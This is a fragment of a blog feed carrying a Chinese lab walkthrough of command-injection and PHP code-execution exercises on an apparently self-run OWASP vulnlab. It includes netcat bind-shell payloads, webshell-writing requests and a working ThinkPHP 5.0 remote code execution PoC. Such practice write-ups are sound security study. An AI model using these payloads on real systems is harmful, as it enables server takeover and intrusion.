+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ipaddress=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | nc -lvp <span class="number">7778</span> -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>本机</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc <span class="number">47.105</span><span class="number">.75</span><span class="number">.177</span> <span class="number">7778</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200426175011326.png" alt="image-20200426175011326"></p>
+<h3 id="c-rce-ping-3"><a href="#c-rce-ping-3" class="headerlink" title="c.rce_ping_3"></a>c.rce_ping_3</h3><p>同样fuzz测试。</p>
+<p><img src="/assets/image-20200426175113764.png" alt="image-20200426175113764"></p>
+<p>发现过滤了<code>&amp; ;</code>同第三关一样的测试即可。</p>
+<h3 id="D-rce-ping-4"><a href="#D-rce-ping-4" class="headerlink" title="D.rce_ping_4"></a>D.rce_ping_4</h3><p>页面500</p>
+<h3 id="E-code"><a href="#E-code" class="headerlink" title="E.code"></a>E.code</h3><p>规定三种能力。（1）列出目录（2）写shell (3)反弹shell</p>
+<h4 id="a-array-filter"><a href="#a-array-filter" class="headerlink" title="a.array_filter"></a>a.array_filter</h4><p>array_filter函数原型array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>
+<p>（1）列出目录</p>
+<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">system</span>&amp;<span class="title">cmd</span>=<span class="title">ls</span></span></span><br></pre></td></tr></table></figure>
+
+<p>成功列举目录</p>
+<p>（2）写shell</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">func</span>=system&amp;echo <span class="string">"&lt;?php <span class="variable">$_POST</span>[pass]&gt; ?&gt;"</span> &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>发现还是不能上传shell???这里想探究下。</p>
+<p><img src="/assets/image-20200426181415386.png" alt="image-20200426181415386"></p>
+<p>当前为apache用户，该文件夹为root创建，而others只有执行和读的权力。</p>
+<p>(3)反弹shell。</p>
+<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">system</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7781 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200426181654848.png" alt="image-20200426181654848"></p>
+<p>反弹成功。</p>
+<h4 id="b-array-map"><a href="#b-array-map" class="headerlink" title="b. array_map"></a>b. array_map</h4><p>array_map原型</p>
+<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">array_map ( callable $callback ,<span class="built_in"> array </span>$array1 [,<span class="built_in"> array </span>$... ] )</span><br></pre></td></tr></table></figure>
+
+<p>同样直接</p>
+<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">exec</span>&amp;<span class="title">nc</span> -<span class="title">lvp</span> 7782 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200426181922754.png" alt="image-20200426181922754"></p>
+<h4 id="c-assert"><a href="#c-assert" class="headerlink" title="c.assert"></a>c.assert</h4><p>assert原型</p>
+<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">assert ( mixed $assertion [, <span class="built_in">string</span> $description ] )</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">shell<span class="constructor">_exec('<span class="params">nc</span> -<span class="params">lvp</span> 7783 -<span class="params">e</span> <span class="operator">/</span><span class="params">bin</span><span class="operator">/</span><span class="params">bash</span>')</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200426182118419.png" alt="image-20200426182118419"></p>
+<h4 id="d-call-user-func"><a href="#d-call-user-func" class="headerlink" title="d.call_user_func"></a>d.call_user_func</h4><p>函数原型</p>
+<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">call_user_func ( callable <span class="symbol">$</span>callback [, mixed <span class="symbol">$</span><span class="keyword">parameter</span> [, mixed <span class="comment">$... ]] )</span></span><br></pre></td></tr></table></figure>
+
+<p>列举目录下文件：</p>
+<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">ls</span></span></span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7784 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200426182340785.png" alt="image-20200426182340785"></p>
+<h4 id="e-create-func"><a href="#e-create-func" class="headerlink" title="e.create_func"></a>e.create_func</h4><p>create_function ( string $args , string $code )</p>
+<p>同样payload:</p>
+<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span>=<span class="title">passthru</span>&amp;<span class="title">cmd</span>=<span class="title">nc</span> -<span class="title">lvp</span> 7785 -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">bash</span></span></span><br></pre></td></tr></table></figure>
+
+<p>发现500了。。。。。。</p>
+<h4 id="f-eval"><a href="#f-eval" class="headerlink" title="f.eval"></a>f.eval</h4><p>eval ( string $code )</p>
+<p>直接shell。</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">system</span><span class="params">(<span class="string">'nc -lvp 31321 -e /bin/bash'</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>连接发现失败。查手册发现eval里的代码必须为PHP代码，且以分号结尾。</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">system('nc -lvp <span class="number">3132</span>1 -e /bin/bash');</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200426183223748.png" alt="image-20200426183223748"></p>
+<p>成功反弹shell。</p>
+<h4 id="g-preg-replace"><a href="#g-preg-replace" class="headerlink" title="g preg_replace"></a>g preg_replace</h4><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="built_in">int</span> $limit = <span class="number">-1</span> [, <span class="built_in">int</span> &amp;$count ]] )</span><br></pre></td></tr></table></figure>
+
+<p>直接cmd=phpinfo();</p>
+<p><img src="/assets/image-20200426183515204.png" alt="image-20200426183515204"></p>
+<p>反弹shell。</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">system('nc -lvp <span class="number">3132</span>2 -e /bin/bash');</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200426183623281.png" alt="image-20200426183623281"></p>
+<h4 id="h-preg-replace2"><a href="#h-preg-replace2" class="headerlink" title="h preg_replace2"></a>h preg_replace2</h4><p>可以在双引号中使用</p>
+<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;$&#123;代码&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>来执行代码</p>
+<p>只能列出目录，</p>
+<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=</span>[<span class="string">php</span>]&#123;$&#123;system(ls)&#125;&#125;[/php]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>正向shell出问题了。</p>
+<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://47.105.75.177/owasp/vulnlab/exec/code/preg_replace_2.php?data=</span>[<span class="string">php</span>]&#123;$&#123;system(<span class="emphasis">'nc -lvp 31322 -e /bin/bash'</span>)&#125;&#125;[/php]</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="F-sys"><a href="#F-sys" class="headerlink" title="F.sys"></a>F.sys</h3><p>由于题目较多，所以只进行简单的测试。</p>
+<ul>
+<li><p>com 500错误</p>
+</li>
+<li><p>exec ls</p>
+</li>
+<li><p>exec_l ls       发现会以数组的形式返回。</p>
+</li>
+<li><p>fyh ls</p>
+</li>
+<li><p>passthru  ls -a</p>
+</li>
+<li><p>popen ls</p>
+</li>
+<li><p>popen_l ls 没反应。此题不会。。。</p>
+</li>
+<li><p>shell_exec ls</p>
+</li>
+<li><p>system  ls  </p>
+</li>
+</ul>
+<h3 id="G-ThinkPHP-V5框架漏洞"><a href="#G-ThinkPHP-V5框架漏洞" class="headerlink" title="G.ThinkPHP V5框架漏洞"></a>G.ThinkPHP V5框架漏洞</h3><p>首先用dirsearch扫描，</p>
+<p><img src="/assets/image-20200426185546367.png" alt="image-20200426185546367"></p>
+<p><img src="/assets/image-20200426185648640.png" alt="image-20200426185648640"></p>
+<p>发现个关键文件README.md，wget下载后发现是5.0版本的ThinkPHP.当然也可以随便输入文件报错看版本：v5.0.22.</p>
+<p>可以用云悉探测。</p>
+<p>搜索历史漏洞。ThinkPHP命令执行漏洞，其影响范围：</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ThinkPHP <span class="number">5.0</span>系列 &lt;<span class="number">5.0</span><span class="number">.23</span>，ThinkPHP <span class="number">5.1</span>系列&lt; <span class="number">5.1</span><span class="number">.31</span>，以及基于ThinkPHP5二次开发的CMS，如AdminLTE后台管理系统、Thinkcmf、ThinkSNS等。</span><br></pre></td></tr></table></figure>
+
+<p>所以直接利用</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?s=/<span class="keyword">index</span>/\think\request/<span class="keyword">cache</span>&amp;key=<span class="number">1</span>|phpinfo</span><br></pre></td></tr></table></figure>
+
+<p>发现不成功。</p>
+<p>利用网上的Poc</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=id</span><br></pre></td></tr></table></figure>
+
+<p>利用成功</p>
+<p><img src="/assets/image-20200426190132905.png" alt="image-20200426190132905"></p>
+<p>正确写shell姿势</p>
+<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="link">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="string">0</span>]=system&amp;vars[1][]=echo ^&lt;?php @eval($<span class="emphasis">_GET["code"])?^&gt;&gt;shell.php</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试正向shell。</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=nc -lvp 31328 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200426190529727.png" alt="image-20200426190529727"></p>
+<p>正向shell成功。</p>
 ]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>web安全</tag>
-        <tag>http</tag>
-      </tags>
   </entry>
   <entry>
     <title>实验-文件包含漏洞</title>
